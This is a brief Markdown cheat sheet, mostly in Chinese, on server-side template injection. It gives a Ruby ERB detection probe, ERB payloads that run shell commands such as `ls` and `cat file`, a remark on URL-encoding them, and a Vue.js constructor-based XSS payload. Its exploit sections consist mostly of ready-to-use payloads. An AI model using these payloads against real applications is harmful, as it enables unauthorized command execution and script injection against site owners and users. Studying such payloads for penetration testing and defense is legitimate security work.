# SSTI
模板注入，別以為用框架就能規避安全問題！  
*  [Ruby erb injection](#ruby-erb-injection)  
   *  [Find](#find)
   *  [Exploit](#exploit)   
*  [Vue.js](#vuejs-template-injection)  
   *  [Exploit](#exploit)  
   
# Ruby erb injection
The erb(ruby-based) template injection.  

## Find
模板注入通常會用**代碼執行與否**來判定是否存在  
```ruby
// based in ERB documentation
<%= syntax of Ruby statement %>
```
因此，我們可以放入像是```<%=8*8%>```這種payload。若是頁面上的結果變成64，則表示這段代碼有被視為ruby**執行**  
下一步就是Command Injection...

## Exploit
```ruby
// <%= 的意思跟 <?= 一樣，都有echo的意思
<%=`ls`%>                   // 這樣便可以把ls的結果全部顯示出來
<%=`cat file`%>
```
依照情況，在url中可能要進行urlencode

# Vuejs template injection
```{{ 執行代碼 }}```  
判定是否存在模板注入  
## Exploit
```js
{{ constructor.constructor("alert('xss')")() }}
```
[Reference](https://github.com/dotboris/vuejs-serverside-template-xss)
